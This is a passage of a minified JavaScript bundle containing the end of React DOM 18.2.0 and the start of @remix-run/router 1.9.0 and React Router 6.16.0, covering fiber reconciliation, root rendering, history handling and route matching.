16:r=e.elementType;e:{switch(Uo(t,e),t=e.pendingProps,i=r._init,r=i(r._payload),e.type=r,i=e.tag=nC(r),t=ut(r,t),i){case 0:e=tc(null,e,r,t,n);break e;case 1:e=Bf(null,e,r,t,n);break e;case 11:e=jf(null,e,r,t,n);break e;case 14:e=zf(null,e,r,ut(r.type,t),n);break e}throw Error(C(306,r,""))}return e;case 0:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ut(r,i),tc(t,e,r,i,n);case 1:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ut(r,i),Bf(t,e,r,i,n);case 3:e:{if(__(e),t===null)throw Error(C(387));r=e.pendingProps,s=e.memoizedState,i=s.element,Bg(t,e),ll(e,r,null,n);var o=e.memoizedState;if(r=o.element,s.isDehydrated)if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},e.updateQueue.baseState=s,e.memoizedState=s,e.flags&256){i=ii(Error(C(423)),e),e=Hf(t,e,r,n,i);break e}else if(r!==i){i=ii(Error(C(424)),e),e=Hf(t,e,r,n,i);break e}else for(Ye=gn(e.stateNode.containerInfo.firstChild),Xe=e,te=!0,dt=null,n=Vg(e,null,r,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(ti(),r===i){e=$t(t,e,n);break e}be(t,e,r,n)}e=e.child}return e;case 5:return qg(e),t===null&&Qu(e),r=e.type,i=e.pendingProps,s=t!==null?t.memoizedProps:null,o=i.children,Vu(r,i)?o=null:s!==null&&Vu(r,s)&&(e.flags|=32),g_(t,e),be(t,e,o,n),e.child;case 6:return t===null&&Qu(e),null;case 13:return v_(t,e,n);case 4:return gd(e,e.stateNode.containerInfo),r=e.pendingProps,t===null?e.child=ni(e,null,r,n):be(t,e,r,n),e.child;case 11:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ut(r,i),jf(t,e,r,i,n);case 7:return be(t,e,e.pendingProps,n),e.child;case 8:return be(t,e,e.pendingProps.children,n),e.child;case 12:return be(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(r=e.type._context,i=e.pendingProps,s=e.memoizedProps,o=i.value,K(sl,r._currentValue),r._currentValue=o,s!==null)if(yt(s.value,o)){if(s.children===i.children&&!We.current){e=$t(t,e,n);break e}}else for(s=e.child,s!==null&&(s.return=e);s!==null;){var l=s.dependencies;if(l!==null){o=s.child;for(var a=l.firstContext;a!==null;){if(a.context===r){if(s.tag===1){a=Ft(-1,n&-n),a.tag=2;var u=s.updateQueue;if(u!==null){u=u.shared;var c=u.pending;c===null?a.next=a:(a.next=c.next,c.next=a),u.pending=a}}s.lanes|=n,a=s.alternate,a!==null&&(a.lanes|=n),Xu(s.return,n,e),l.lanes|=n;break}a=a.next}}else if(s.tag===10)o=s.type===e.type?null:s.child;else if(s.tag===18){if(o=s.return,o===null)throw Error(C(341));o.lanes|=n,l=o.alternate,l!==null&&(l.lanes|=n),Xu(o,n,e),o=s.sibling}else o=s.child;if(o!==null)o.return=s;else for(o=s;o!==null;){if(o===e){o=null;break}if(s=o.sibling,s!==null){s.return=o.return,o=s;break}o=o.return}s=o}be(t,e,i.children,n),e=e.child}return e;case 9:return i=e.type,r=e.pendingProps.children,$r(e,n),i=st(i),r=r(i),e.flags|=1,be(t,e,r,n),e.child;case 14:return r=e.type,i=ut(r,e.pendingProps),i=ut(r.type,i),zf(t,e,r,i,n);case 15:return p_(t,e,e.type,e.pendingProps,n);case 17:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ut(r,i),Uo(t,e),e.tag=1,$e(r)?(t=!0,nl(e)):t=!1,$r(e,n),Wg(e,r,i),Zu(e,r,i,n),nc(null,e,r,!0,t,n);case 19:return y_(t,e,n);case 22:return m_(t,e,n)}throw Error(C(156,e.tag))};function D_(t,e){return lg(t,e)}function tC(t,e,n,r){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function rt(t,e,n,r){return new tC(t,e,n,r)}function Ad(t){return t=t.prototype,!(!t||!t.isReactComponent)}function nC(t){if(typeof t=="function")return Ad(t)?1:0;if(t!=null){if(t=t.$$typeof,t===Qc)return 11;if(t===Xc)return 14}return 2}function wn(t,e){var n=t.alternate;return n===null?(n=rt(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function zo(t,e,n,r,i,s){var o=2;if(r=t,typeof t=="function")Ad(t)&&(o=1);else if(typeof t=="string")o=5;else e:switch(t){case Rr:return Kn(n.children,i,s,e);case Yc:o=8,i|=8;break;case Su:return t=rt(12,n,e,i|2),t.elementType=Su,t.lanes=s,t;case Tu:return t=rt(13,n,e,i),t.elementType=Tu,t.lanes=s,t;case Iu:return t=rt(19,n,e,i),t.elementType=Iu,t.lanes=s,t;case $m:return ra(n,i,s,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case Hm:o=10;break e;case Wm:o=9;break e;case Qc:o=11;break e;case Xc:o=14;break e;case en:o=16,r=null;break e}throw Error(C(130,t==null?t:typeof t,""))}return e=rt(o,n,e,i),e.elementType=t,e.type=r,e.lanes=s,e}function Kn(t,e,n,r){return t=rt(7,t,r,e),t.lanes=n,t}function ra(t,e,n,r){return t=rt(22,t,r,e),t.elementType=$m,t.lanes=n,t.stateNode={isHidden:!1},t}function Ja(t,e,n){return t=rt(6,t,null,e),t.lanes=n,t}function Za(t,e,n){return e=rt(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function rC(t,e,n,r,i){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=ba(0),this.expirationTimes=ba(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ba(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Od(t,e,n,r,i,s,o,l,a){return t=new rC(t,e,n,l,a),e===1?(e=1,s===!0&&(e|=8)):e=0,s=rt(3,null,null,e),t.current=s,s.stateNode=t,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},md(s),t}function iC(t,e,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:kr,key:r==null?null:""+r,children:t,containerInfo:e,implementation:n}}function M_(t){if(!t)return kn;t=t._reactInternals;e:{if(pr(t)!==t||t.tag!==1)throw Error(C(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if($e(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(C(171))}if(t.tag===1){var n=t.type;if($e(n))return Dg(t,n,e)}return e}function U_(t,e,n,r,i,s,o,l,a){return t=Od(n,r,!0,t,i,s,o,l,a),t.context=M_(null),n=t.current,r=Le(),i=yn(n),s=Ft(r,i),s.callback=e??null,_n(n,s,i),t.current.lanes=i,zs(t,i,r),Ve(t,r),t}function ia(t,e,n,r){var i=e.current,s=Le(),o=yn(i);return n=M_(n),e.context===null?e.context=n:e.pendingContext=n,e=Ft(s,o),e.payload={element:t},r=r===void 0?null:r,r!==null&&(e.callback=r),t=_n(i,e,o),t!==null&&(_t(t,i,o,s),Lo(t,i,o)),o}function ml(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function Jf(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function bd(t,e){Jf(t,e),(t=t.alternate)&&Jf(t,e)}function sC(){return null}var F_=typeof reportError=="function"?reportError:function(t){console.error(t)};function Ld(t){this._internalRoot=t}sa.prototype.render=Ld.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(C(409));ia(t,e,null,null)};sa.prototype.unmount=Ld.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;rr(function(){ia(null,t,null,null)}),e[Ht]=null}};function sa(t){this._internalRoot=t}sa.prototype.unstable_scheduleHydration=function(t){if(t){var e=pg();t={blockedOn:null,target:t,priority:e};for(var n=0;n<nn.length&&e!==0&&e<nn[n].priority;n++);nn.splice(n,0,t),n===0&&gg(t)}};function Dd(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function oa(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Zf(){}function oC(t,e,n,r,i){if(i){if(typeof r=="function"){var s=r;r=function(){var u=ml(o);s.call(u)}}var o=U_(e,r,t,0,null,!1,!1,"",Zf);return t._reactRootContainer=o,t[Ht]=o.current,ms(t.nodeType===8?t.parentNode:t),rr(),o}for(;i=t.lastChild;)t.removeChild(i);if(typeof r=="function"){var l=r;r=function(){var u=ml(a);l.call(u)}}var a=Od(t,0,!1,null,null,!1,!1,"",Zf);return t._reactRootContainer=a,t[Ht]=a.current,ms(t.nodeType===8?t.parentNode:t),rr(function(){ia(e,a,n,r)}),a}function la(t,e,n,r,i){var s=n._reactRootContainer;if(s){var o=s;if(typeof i=="function"){var l=i;i=function(){var a=ml(o);l.call(a)}}ia(e,o,t,i)}else o=oC(n,e,t,i,r);return ml(o)}hg=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=Hi(e.pendingLanes);n!==0&&(ed(e,n|1),Ve(e,ue()),!(B&6)&&(si=ue()+500,On()))}break;case 13:rr(function(){var r=Wt(t,1);if(r!==null){var i=Le();_t(r,t,1,i)}}),bd(t,1)}};td=function(t){if(t.tag===13){var e=Wt(t,134217728);if(e!==null){var n=Le();_t(e,t,134217728,n)}bd(t,134217728)}};fg=function(t){if(t.tag===13){var e=yn(t),n=Wt(t,e);if(n!==null){var r=Le();_t(n,t,e,r)}bd(t,e)}};pg=function(){return $};mg=function(t,e){var n=$;try{return $=t,e()}finally{$=n}};Du=function(t,e,n){switch(e){case"input":if(Nu(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var r=n[e];if(r!==t&&r.form===t.form){var i=Xl(r);if(!i)throw Error(C(90));qm(r),Nu(r,i)}}}break;case"textarea":Km(t,n);break;case"select":e=n.value,e!=null&&zr(t,!!n.multiple,e,!1)}};tg=Nd;ng=rr;var lC={usingClientEntryPoint:!1,Events:[Hs,Ar,Xl,Zm,eg,Nd]},Oi={findFiberByHostInstance:Bn,bundleType:0,version:"18.2.0",rendererPackageName:"react-dom"},aC={bundleType:Oi.bundleType,version:Oi.version,rendererPackageName:Oi.rendererPackageName,rendererConfig:Oi.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Kt.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=sg(t),t===null?null:t.stateNode},findFiberByHostInstance:Oi.findFiberByHostInstance||sC,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.2.0-next-9e3b772b8-20220608"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var So=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!So.isDisabled&&So.supportsFiber)try{Gl=So.inject(aC),It=So}catch{}}Ze.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=lC;Ze.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Dd(e))throw Error(C(200));return iC(t,e,null,n)};Ze.createRoot=function(t,e){if(!Dd(t))throw Error(C(299));var n=!1,r="",i=F_;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(r=e.identifierPrefix),e.onRecoverableError!==void 0&&(i=e.onRecoverableError)),e=Od(t,1,!1,null,null,n,!1,r,i),t[Ht]=e.current,ms(t.nodeType===8?t.parentNode:t),new Ld(e)};Ze.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(C(188)):(t=Object.keys(t).join(","),Error(C(268,t)));return t=sg(e),t=t===null?null:t.stateNode,t};Ze.flushSync=function(t){return rr(t)};Ze.hydrate=function(t,e,n){if(!oa(e))throw Error(C(200));return la(null,t,e,!0,n)};Ze.hydrateRoot=function(t,e,n){if(!Dd(t))throw Error(C(405));var r=n!=null&&n.hydratedSources||null,i=!1,s="",o=F_;if(n!=null&&(n.unstable_strictMode===!0&&(i=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(o=n.onRecoverableError)),e=U_(e,null,t,1,n??null,i,!1,s,o),t[Ht]=e.current,ms(t),r)for(t=0;t<r.length;t++)n=r[t],i=n._getVersion,i=i(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,i]:e.mutableSourceEagerHydrationData.push(n,i);return new sa(e)};Ze.render=function(t,e,n){if(!oa(e))throw Error(C(200));return la(null,t,e,!1,n)};Ze.unmountComponentAtNode=function(t){if(!oa(t))throw Error(C(40));return t._reactRootContainer?(rr(function(){la(null,null,t,!1,function(){t._reactRootContainer=null,t[Ht]=null})}),!0):!1};Ze.unstable_batchedUpdates=Nd;Ze.unstable_renderSubtreeIntoContainer=function(t,e,n,r){if(!oa(n))throw Error(C(200));if(t==null||t._reactInternals===void 0)throw Error(C(38));return la(t,e,n,!1,r)};Ze.version="18.2.0-next-9e3b772b8-20220608";function j_(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(j_)}catch(t){console.error(t)}}j_(),Um.exports=Ze;var uC=Um.exports,ep=uC;Eu.createRoot=ep.createRoot,Eu.hydrateRoot=ep.hydrateRoot;/**
 * @remix-run/router v1.9.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ts(){return Ts=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},Ts.apply(this,arguments)}var hn;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})(hn||(hn={}));const tp="popstate";function cC(t){t===void 0&&(t={});function e(r,i){let{pathname:s,search:o,hash:l}=r.location;return pc("",{pathname:s,search:o,hash:l},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function n(r,i){return typeof i=="string"?i:gl(i)}return hC(e,n,null,t)}function de(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function Md(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function dC(){return Math.random().toString(36).substr(2,8)}function np(t,e){return{usr:t.state,key:t.key,idx:e}}function pc(t,e,n,r){return n===void 0&&(n=null),Ts({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?mi(e):e,{state:n,key:e&&e.key||r||dC()})}function gl(t){let{pathname:e="/",search:n="",hash:r=""}=t;return n&&n!=="?"&&(e+=n.charAt(0)==="?"?n:"?"+n),r&&r!=="#"&&(e+=r.charAt(0)==="#"?r:"#"+r),e}function mi(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substr(n),t=t.substr(0,n));let r=t.indexOf("?");r>=0&&(e.search=t.substr(r),t=t.substr(0,r)),t&&(e.pathname=t)}return e}function hC(t,e,n,r){r===void 0&&(r={});let{window:i=document.defaultView,v5Compat:s=!1}=r,o=i.history,l=hn.Pop,a=null,u=c();u==null&&(u=0,o.replaceState(Ts({},o.state,{idx:u}),""));function c(){return(o.state||{idx:null}).idx}function d(){l=hn.Pop;let w=c(),p=w==null?null:w-u;u=w,a&&a({action:l,location:v.location,delta:p})}function h(w,p){l=hn.Push;let f=pc(v.location,w,p);n&&n(f,w),u=c()+1;let g=np(f,u),y=v.createHref(f);try{o.pushState(g,"",y)}catch(T){if(T instanceof DOMException&&T.name==="DataCloneError")throw T;i.location.assign(y)}s&&a&&a({action:l,location:v.location,delta:1})}function m(w,p){l=hn.Replace;let f=pc(v.location,w,p);n&&n(f,w),u=c();let g=np(f,u),y=v.createHref(f);o.replaceState(g,"",y),s&&a&&a({action:l,location:v.location,delta:0})}function _(w){let p=i.location.origin!=="null"?i.location.origin:i.location.href,f=typeof w=="string"?w:gl(w);return de(p,"No window.location.(origin|href) available to create URL for href: "+f),new URL(f,p)}let v={get action(){return l},get location(){return t(i,o)},listen(w){if(a)throw new Error("A history only accepts one active listener");return i.addEventListener(tp,d),a=w,()=>{i.removeEventListener(tp,d),a=null}},createHref(w){return e(i,w)},createURL:_,encodeLocation(w){let p=_(w);return{pathname:p.pathname,search:p.search,hash:p.hash}},push:h,replace:m,go(w){return o.go(w)}};return v}var rp;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(rp||(rp={}));function fC(t,e,n){n===void 0&&(n="/");let r=typeof e=="string"?mi(e):e,i=Ud(r.pathname||"/",n);if(i==null)return null;let s=z_(t);pC(s);let o=null;for(let l=0;o==null&&l<s.length;++l)o=SC(s[l],kC(i));return o}function z_(t,e,n,r){e===void 0&&(e=[]),n===void 0&&(n=[]),r===void 0&&(r="");let i=(s,o,l)=>{let a={relativePath:l===void 0?s.path||"":l,caseSensitive:s.caseSensitive===!0,childrenIndex:o,route:s};a.relativePath.startsWith("/")&&(de(a.relativePath.startsWith(r),'Absolute route path "'+a.relativePath+'" nested under path '+('"'+r+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),a.relativePath=a.relativePath.slice(r.length));let u=En([r,a.relativePath]),c=n.concat(a);s.children&&s.children.length>0&&(de(s.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+u+'".')),z_(s.children,e,c,u)),!(s.path==null&&!s.index)&&e.push({path:u,score:EC(u,s.index),routesMeta:c})};return t.forEach((s,o)=>{var l;if(s.path===""||!((l=s.path)!=null&&l.includes("?")))i(s,o);else for(let a of B_(s.path))i(s,o,a)}),e}function B_(t){let e=t.split("/");if(e.length===0)return[];let[n,...r]=e,i=n.endsWith("?"),s=n.replace(/\?$/,"");if(r.length===0)return i?[s,""]:[s];let o=B_(r.join("/")),l=[];return l.push(...o.map(a=>a===""?s:[s,a].join("/"))),i&&l.push(...o),l.map(a=>t.startsWith("/")&&a===""?"/":a)}function pC(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:CC(e.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}const mC=/^:\w+$/,gC=3,_C=2,vC=1,yC=10,wC=-2,ip=t=>t==="*";function EC(t,e){let n=t.split("/"),r=n.length;return n.some(ip)&&(r+=wC),e&&(r+=_C),n.filter(i=>!ip(i)).reduce((i,s)=>i+(mC.test(s)?gC:s===""?vC:yC),r)}function CC(t,e){return t.length===e.length&&t.slice(0,-1).every((r,i)=>r===e[i])?t[t.length-1]-e[e.length-1]:0}function SC(t,e){let{routesMeta:n}=t,r={},i="/",s=[];for(let o=0;o<n.length;++o){let l=n[o],a=o===n.length-1,u=i==="/"?e:e.slice(i.length)||"/",c=TC({path:l.relativePath,caseSensitive:l.caseSensitive,end:a},u);if(!c)return null;Object.assign(r,c.params);let d=l.route;s.push({params:r,pathname:En([i,c.pathname]),pathnameBase:xC(En([i,c.pathnameBase])),route:d}),c.pathnameBase!=="/"&&(i=En([i,c.pathnameBase]))}return s}function TC(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,r]=IC(t.path,t.caseSensitive,t.end),i=e.match(n);if(!i)return null;let s=i[0],o=s.replace(/(.)\/+$/,"$1"),l=i.slice(1);return{params:r.reduce((u,c,d)=>{if(c==="*"){let h=l[d]||"";o=s.slice(0,s.length-h.length).replace(/(.)\/+$/,"$1")}return u[c]=RC(l[d]||"",c),u},{}),pathname:s,pathnameBase:o,pattern:t}}function IC(t,e,n){e===void 0&&(e=!1),n===void 0&&(n=!0),Md(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let r=[],i="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^$?{}|()[\]]/g,"\\$&").replace(/\/:(\w+)/g,(o,l)=>(r.push(l),"/([^\\/]+)"));return t.endsWith("*")?(r.push("*"),i+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":t!==""&&t!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),r]}function kC(t){try{return decodeURI(t)}catch(e){return Md(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function RC(t,e){try{return decodeURIComponent(t)}catch(n){return Md(!1,'The value for the URL param "'+e+'" will not be decoded because'+(' the string "'+t+'" is a malformed URL segment. This is probably')+(" due to a bad percent encoding ("+n+").")),t}}function Ud(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,r=t.charAt(n);return r&&r!=="/"?null:t.slice(n)||"/"}function NC(t,e){e===void 0&&(e="/");let{pathname:n,search:r="",hash:i=""}=typeof t=="string"?mi(t):t;return{pathname:n?n.startsWith("/")?n:PC(n,e):e,search:AC(r),hash:OC(i)}}function PC(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(i=>{i===".."?n.length>1&&n.pop():i!=="."&&n.push(i)}),n.length>1?n.join("/"):"/"}function eu(t,e,n,r){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(r)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function H_(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function W_(t,e,n,r){r===void 0&&(r=!1);let i;typeof t=="string"?i=mi(t):(i=Ts({},t),de(!i.pathname||!i.pathname.includes("?"),eu("?","pathname","search",i)),de(!i.pathname||!i.pathname.includes("#"),eu("#","pathname","hash",i)),de(!i.search||!i.search.includes("#"),eu("#","search","hash",i)));let s=t===""||i.pathname==="",o=s?"/":i.pathname,l;if(r||o==null)l=n;else{let d=e.length-1;if(o.startsWith("..")){let h=o.split("/");for(;h[0]==="..";)h.shift(),d-=1;i.pathname=h.join("/")}l=d>=0?e[d]:"/"}let a=NC(i,l),u=o&&o!=="/"&&o.endsWith("/"),c=(s||o===".")&&n.endsWith("/");return!a.pathname.endsWith("/")&&(u||c)&&(a.pathname+="/"),a}const En=t=>t.join("/").replace(/\/\/+/g,"/"),xC=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),AC=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,OC=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function bC(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const $_=["post","put","patch","delete"];new Set($_);const LC=["get",...$_];new Set(LC);/**
 * React Router v6.16.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function _l(){return _l=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},_l.apply(this,arguments)}const Fd=I.createContext(null),V_=I.createContext(null),mr=I.createContext(null),aa=I.createContext(null),bn=I.createContext({outlet:null,matches:[],isDataRoute:!1}),q_=I.createContext(null);function DC(t,e){let{relative:n}=e===void 0?{}:e;$s()||de(!1);let{basename:r,navigator:i}=I.useContext(mr),{hash:s,pathname:o,search:l}=zd(t,{relative:n}),a=o;return r!=="/"&&(a=o==="/"?r:En([r,o])),i.createHref({pathname:a,search:l,hash:s})}function $s(){return I.useContext(aa)!=null}function Vs(){return $s()||de(!1),I.useContext(aa).location}function G_(t){I.useContext(mr).static||I.useLayoutEffect(t)}function oi(){let{isDataRoute:t}=I.useContext(bn);return t?KC():MC()}function MC(){$s()||de(!1);let t=I.useContext(Fd),{basename:e,navigator:n}=I.useContext(mr),{matches:r}=I.useContext(bn),{pathname:i}=Vs(),s=JSON.stringify(H_(r).map(a=>a.pathnameBase)),o=I.useRef(!1);return G_(()=>{o.current=!0}),I.useCallback(function(a,u){if(u===void 0&&(u={}),!o.current)return;if(typeof a=="number"){n.go(a);return}let c=W_(a,JSON.parse(s),i,u.relative==="path");t==null&&e!=="/"&&(c.pathname=c.pathname==="/"?e:En([e,c.pathname])),(u.replace?n.replace:n.push)(c,u.state,u)},[e,n,s,i,t])}function jd(){let{matches:t}=I.useContext(bn),e=t[t.length-1];return e?e.params:{}}function zd(t,e){let{relative:n}=e===void 0?{}:e,{matches:r}=I.useContext(bn),{pathname:i}=Vs(),s=JSON.stringify(H_(r).map(o=>o.pathnameBase));return I.useMemo(()=>W_(t,JSON.parse(s),i,n==="path"),[t,s,i,n])}function UC(t,e){return FC(t,e)}function FC(t,e,n){$s()||de(!1);let{navigator:r}=I.useContext(mr),{matches:i}=I.useContext(bn),s=i[i.length-1],o=s?s.params:{};s&&s.pathname;let l=s?s.pathnameBase:"/";s&&s.route;let a=Vs(),u;if(e){var c;let v=typeof e=="string"?mi(e):e;l==="/"||(c=v.pathname)!=null&&c.startsWith(l)||de(!1),u=v}else u=a;let d=u.pathname||"/",h=l==="/"?d:d.slice(l.length)||"/",m=fC(t,{pathname:h}),_=WC(m&&m.map(v=>Object.assign({},v,{params:Object.assign({},o,v.params),pathname:En([l,r.encodeLocation?r.encodeLocation(v.pathname).pathname:v.pathname]),pathnameBase:v.pathnameBase==="/"?l:En([l,r.encodeLocation?r.encodeLocation(v.pathnameBase).pathname:v.pathnameBase])})),i,n);return e&&_?I.createElement(aa.Provider,{value:{location:_l({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:hn.Pop}},_):_}function jC(){let t=GC(),e=bC(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"},s=null;return I.createElement(I.Fragment,null,I.createElement("h2",null,"Unexpected Application Error!"),I.createElement("h3",{style:{fontStyle:"italic"}},e),n?I.createElement("pre",{style:i},n):null,s)}const zC=I.createElement(jC,null);class BC extends I.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,n){return n.location!==e.location||n.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error||n.error,location:n.location,revalidation:e.revalidation||n.revalidation}}componentDidCatch(e,n){console.error("React Router caught the following error during render",e,n)}render(){return this.state.error?I.createElement(bn.Provider,{value:this.props.routeContext},I.createElement(q_.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function HC(t){let{routeContext:e,match:n,children:r}=t,i=I.useContext(Fd);return i&&i.static&&i.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=n.route.id),I.createElement(bn.Provider,{value:e},r)}function WC(t,e,n){var r;if(e===void 0&&(e=[]),n===void 0&&(n=null),t==null){var i;if((i=n)!=null&&i.errors)t=n.matches;else return null}let s=t,o=(r=n)==null?void 0:r.errors;if(o!=null){let l=s.findIndex(a=>a.route.id&&(o==null?void 0:o[a.route.id]));l>=0||de(!1),s=s.slice(0,Math.min(s.length,l+1))}return s.reduceRight((l,a,u)=>{let c=a.route.id?o==null?void 0:o[a.route.id]:null,d=null;n&&(d=a.route.errorElement||zC);let h=e.concat(s.slice(0,u+1)),m=()=>{let _;return c?_=d:a.route.Component?_=I.createElement(a.route.Component,null):a.route.element?_=a.route.element:_=l,I.createElement(HC,{match:a,routeContext:{outlet:l,matches:h,isDataRoute:n!=null},children:_})};return 